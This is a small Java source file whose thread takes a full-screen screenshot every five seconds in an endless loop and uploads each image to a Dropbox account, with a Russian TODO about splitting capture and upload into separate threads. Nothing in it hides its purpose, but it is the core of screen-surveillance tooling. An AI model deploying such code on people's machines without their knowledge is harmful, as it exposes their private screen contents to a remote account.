package com.dannyp;

import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;


//TODO: Разделить создание скриншотов и загрузку на Dropbox по разным потокам, чтобы время между двумя
//TODO: последовательными снимками было фиксированным.


public class NewThread extends Thread {

    @Override
    public void run() {
        try {

            int CAPPING_DURATION = 5000;

            Robot r = new Robot();
            SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");

            for (; ; ) {
                Date now = new Date();
                String screenshotName = formatter.format(now);
                BufferedImage screenshot = r.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));

                try {
                    ByteArrayOutputStream os = new ByteArrayOutputStream();
                    ImageIO.write(screenshot, "png", os);
                    InputStream in = new ByteArrayInputStream(os.toByteArray());

                    FileMetadata metadata = Main.client.files().uploadBuilder("/" + screenshotName + ".png")
                            .uploadAndFinish(in);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                sleep(CAPPING_DURATION);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}